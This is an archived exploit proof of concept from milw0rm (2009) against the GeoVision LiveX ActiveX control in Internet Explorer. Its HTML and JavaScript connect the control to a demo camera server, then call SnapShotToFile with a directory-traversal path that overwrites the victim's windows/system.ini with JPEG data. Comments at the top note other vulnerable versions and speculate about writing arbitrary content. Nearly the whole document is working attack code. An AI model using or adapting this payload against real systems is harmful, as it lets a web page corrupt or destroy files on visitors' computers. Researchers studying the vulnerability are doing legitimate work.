<html><head><title>GeoVision LiveX_v8200 ActiveX (LIVEX_~1.OCX) File Corruption PoC</title></head><pre>&lt;!--
GeoVision LiveX_v8200 ActiveX Control (LIVEX_~1.OCX) remote file corruption poc
by Nine:Situations:Group::SnoopyAssault
site: http://retrogod.altervista.org/

working against IE8b/xpsp3, safe for scripting and for initialize.
LiveX_v7000 with clsid {DA8484DE-52DB-4860-A986-61A8682E298A}
LiveX_v8120 with clsid {F4421170-DB22-4551-BBFB-FFCFFB419F6F}
have the same SnapShotToFile() and SnapShotX() methods

this poc connects to a live demo server and replaces system.ini with jpeg content...
could we set arbitrary content (???) ... maybe trough a fake server, checking ...
--&gt;
&lt;html&gt;
&lt;head&gt;
&lt;script language=&quot;JavaScript&quot;&gt;
function sleep(n)
{
    var now = new Date();
    var exitTime = now.getTime() + (n*1000);
    while (true) {
        now = new Date();
            if (now.getTime() &gt; exitTime) return;
    }
}
&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
	&lt;object classid=&quot;clsid:8D58D690-6B71-4ee8-85AD-006DB0287BF1&quot; id=&quot;WebCamX1&quot; width=&quot;360&quot; height=&quot;300&quot;&gt;
            &lt;param name=&quot;IpAddress&quot; value=&quot;http://24.248.47.203&quot; ref&gt; &lt;!-- demo server --&gt;
            &lt;param name=&quot;DisablePWD&quot; value=&quot;-1&quot;&gt;
            &lt;param name=&quot;UserName&quot; value=&quot;wec&quot;&gt;
            &lt;param name=&quot;Password&quot; value=&quot;&quot;&gt;
          	&lt;param name=&quot;CommandPort&quot; value=&quot;4550&quot;&gt;
			&lt;param name=&quot;DataPort&quot; value=&quot;5550&quot;&gt;
			&lt;param name=&quot;AudioDataPort&quot; value=&quot;6550&quot;&gt;
			&lt;param name=&quot;BandWidth&quot; value=&quot;LAN&quot;&gt;
			&lt;param name=&quot;FixSize&quot; value=&quot;0&quot;&gt;
			&lt;param name=&quot;FixWidth&quot; value=&quot;320&quot;&gt;
			&lt;param name=&quot;FixHeight&quot; value=&quot;240&quot;&gt;
			&lt;param name=&quot;SvrType&quot; value=&quot;0&quot;&gt;
			&lt;param name=&quot;AutoLogin&quot; value=&quot;0&quot;&gt;
			&lt;param name=&quot;DefaultCam&quot; value=&quot;1&quot;&gt;
			&lt;param name=&quot;AutoReConnect&quot; value=&quot;-1&quot;&gt;
			&lt;param name=&quot;MaxRetries&quot; value=&quot;-1&quot;&gt;
			&lt;param name=&quot;RetryInterval&quot; value=&quot;70&quot;&gt;
          &lt;/object&gt;
&lt;script language=&quot;JavaScript&quot;&gt;
  sleep(2);
  //WebCamX1.SetCntDeviceType(0);
  //WebCamX1.EnableAutoScreenSize(1);
  //WebCamX1.SetInfo(125,1,0,&quot;&quot;,&quot;&quot;);
  //WebCamX1.SetInfo(129,1,0,&quot;&quot;,&quot;&quot;);	
  //WebCamX1.SetUpdateInfo(100, &quot;WebCam&quot;, 0, &quot;&quot;, 8200, 0,0);
  //WebCamX1.DefaultCam = 1;
  WebCamX1.PlayX();
  sleep(2);
  WebCamX1.SnapShotToFile(&quot;../../../../../../../../../../../windows/system.ini&quot;);
  WebCamX1.SnapShotX();
&lt;/script&gt;    		
&lt;/body&gt;
&lt;/html&gt;

# milw0rm.com [2009-02-16]</pre></html>